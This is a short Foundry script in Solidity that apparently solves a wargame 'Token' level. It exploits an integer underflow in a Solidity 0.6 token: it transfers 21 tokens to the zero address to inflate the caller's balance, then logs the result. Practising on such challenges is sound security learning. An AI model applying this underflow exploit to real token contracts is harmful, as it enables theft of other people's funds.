// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level4Sol is Script{

    Token public level5 = Token(0xf363A66580c0E202396333d08Fc53e18cbcc625F);

    function run() external{
    
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("total supply:",level5.totalSupply());
    level5.transfer(address(0),21);
    console.log("MY balance:",level5.balanceOf(vm.envAddress("MY_ADDRESS")));
    vm.stopBroadcast();
    }
}
